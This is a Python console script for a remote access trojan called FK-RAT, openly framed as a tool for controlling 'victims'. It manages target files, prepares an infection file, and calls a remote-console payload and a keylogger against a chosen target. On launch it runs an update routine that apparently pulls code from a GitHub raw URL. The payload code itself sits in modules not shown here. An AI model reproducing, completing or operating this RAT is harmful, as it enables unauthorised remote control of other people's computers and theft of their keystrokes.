#!/usr/bin/python
# python console for FK-RAT
# created by: Sunnickel
# inspired by: COSMO

import getpass
import os
import sys

from modules import options as opt
from modules import payloads as pay

## variables
banner = """
     ▄▀▀▀█▄    ▄▀▀█▀▄    ▄▀▀▄ ▀▄  ▄▀▀█▄▄   ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄  ▄▀▀▀▀▄      ▄▀▀▄ █  ▄▀▀█▄▄▄▄  ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄  ▄▀▀▀▀▄ 
    █  ▄▀  ▀▄ █   █  █  █  █ █ █ █ ▄▀   █ ▐  ▄▀   ▐ █   █   █ █ █   ▐     █  █ ▄▀ ▐  ▄▀   ▐ ▐  ▄▀   ▐ █   █   █ ▐  ▄▀   ▐ █   █   █ █ █   ▐ 
    ▐ █▄▄▄▄   ▐   █  ▐  ▐  █  ▀█ ▐ █    █   █▄▄▄▄▄  ▐  █▀▀█▀     ▀▄       ▐  █▀▄    █▄▄▄▄▄    █▄▄▄▄▄  ▐  █▀▀▀▀    █▄▄▄▄▄  ▐  █▀▀█▀     ▀▄   
     █    ▐       █       █   █    █    █   █    ▌   ▄▀    █  ▀▄   █        █   █   █    ▌    █    ▌     █        █    ▌   ▄▀    █  ▀▄   █  
     █         ▄▀▀▀▀▀▄  ▄▀   █    ▄▀▄▄▄▄▀  ▄▀▄▄▄▄   █     █    █▀▀▀       ▄▀   █   ▄▀▄▄▄▄    ▄▀▄▄▄▄    ▄▀        ▄▀▄▄▄▄   █     █    █▀▀▀   
    █         █       █ █    ▐   █     ▐   █    ▐   ▐     ▐    ▐          █    ▐   █    ▐    █    ▐   █          █    ▐   ▐     ▐    ▐      
    ▐         ▐       ▐ ▐        ▐         ▐                              ▐        ▐         ▐        ▐          ▐                          


        [::] Finders Keepers | You found the victim, we keep it
        [::] Created by : Sunnickel
        [::] Inspired by : BlueCosmo
"""
help_menu = """
        Arguments:
            new     Adds a new target to the RAT
            load    Loads a target file
            remove  Remove FK RAT on your Computer
"""
option_menu = """
        [*] Select a number to use a payload

        Payloads:
            [0]     Remote Console
            [1]     Keylogger

        Options:
            [*0]    Edit Target File
            [*1]    Delete Target
"""
target_menu = """
        [*] Select a Target

        Targets:
"""

username = getpass.getuser()
header = f"{username}@FK-RAT"
github_path = "https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/"
local_path = f"/home/{username}/.FK-RAT" if username != "root" else "/root/.FK-RAT"


# command line interface
def cli():
    print(banner)
    try:
        argument = sys.argv[1]
    except IndexError:
        print(help_menu)
        exit()
    if argument == "update":
        opt.update()
    if argument == "uninstall" or argument == "remove":
        opt.remove()
    if argument == "new":
        opt.new_file()
    if argument == "prepaire":
        opt.prepairInfectionFile()
    if argument == "load":
        print(target_menu)
        targets = opt.getTargets(help_menu)
        option = input(header + " $ ")
        try:
            int(option)
        except:
            print("[!!] Please Enter a valid option")
            exit()
        if len(option) <= len(targets):
            try:
                choosenfile = targets[int(option)]
            except IndexError:
                print("[!!] Please enter a valid file")
                exit()
            print(option_menu)
            option = input(header + " > " + choosenfile + " $ ")
            ## PAYLOADS for Target
            if option == "0":  # SSH Connection to target
                pay.remoteConsole(choosenfile)
            elif option == "1":  # Keylogger
                pay.keylogger(choosenfile)

            ## OPTIONS for Target
            elif option == "*0":  # Edit File
                opt.edit_file(choosenfile)
            elif option == "*1":  # Delete File
                opt.delete_file(choosenfile)
            else:
                print("[!!] Please Enter a valid option")
    else:
        print(help_menu)


# main code
def main():
    cli()

def ver():
    return "v0.1"
# run main code
if __name__ == "__main__":
    opt.update()
    main()
